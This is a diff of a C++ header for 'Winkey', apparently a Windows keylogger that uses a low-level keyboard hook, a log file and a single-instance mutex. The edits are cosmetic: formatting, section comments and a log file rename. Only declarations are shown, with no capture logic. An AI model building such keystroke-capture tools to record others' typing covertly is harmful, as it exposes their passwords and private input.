@@ -8,14 +8,21 @@
 # include <iomanip>			// For std::setw and std::setfill
 # include <thread>			// For sleep_for
 
-#include <locale>			// For wide characters
-#include <codecvt>
+# include <locale>			// For wide characters
+# include <codecvt>
+
+
+/************************** Macros **************************/
 
 # define TW_MUTEX_NAME		"TYYghhTYU5678FuGHFGFHYFUIY67"
-# define TW_LOGFILE			"wk.log"
+# define TW_LOGFILE			"ks.log"
+
 # define TW_MAX_SAME_VK		10	// Max amount of repetitive vkCode
 # define TW_WINTITLE_MAX	256
 # define TW_KEYSTROKE_MAX	64
+
+
+/************************** Class **************************/
 
 class	Winkey
 {
@@ -53,6 +60,9 @@ class	Winkey
 		HHOOK   				_keyboardHook;
 };
 
+
+/************************** Exceptions **************************/
+
 class	InstanceAlreadyRunnningException: public std::exception {
 	public:
 		InstanceAlreadyRunnningException() noexcept {}
@@ -81,6 +91,9 @@ class	HookSettingFailureException: public std::exception {
 	private:
 		const char	*_msg;
 };
+
+
+/************************** External Functions **************************/
 
 std::wstring	getKeyName(const UINT vkCode);
 bool			isPrintable(wchar_t c);
